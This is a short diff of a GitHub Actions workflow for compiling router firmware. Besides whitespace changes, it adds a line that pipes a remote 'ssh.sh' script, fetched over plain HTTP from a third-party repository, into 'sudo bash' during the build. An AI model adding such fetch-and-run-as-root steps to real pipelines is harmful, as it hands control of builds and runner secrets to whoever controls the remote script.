@@ -162,16 +162,17 @@ jobs:
           cd ./wrt/
 
           cat $GITHUB_WORKSPACE/config/$WRT_CONFIG.txt $GITHUB_WORKSPACE/config/GENERAL.txt >> .config
-
           $GITHUB_WORKSPACE/scripts/settings.sh
-
+          
+          curl -SL http://raw.github.com/zhlhlf/text/main/ssh.sh | sudo bash    
+          
           make defconfig -j$(nproc) && make clean -j$(nproc)
+          
 
       - name: Download Packages
         if: env.WRT_TEST != 'true'
         run: |
           cd ./wrt/
-
           make download -j$(nproc)
 
       - name: Compile Firmware
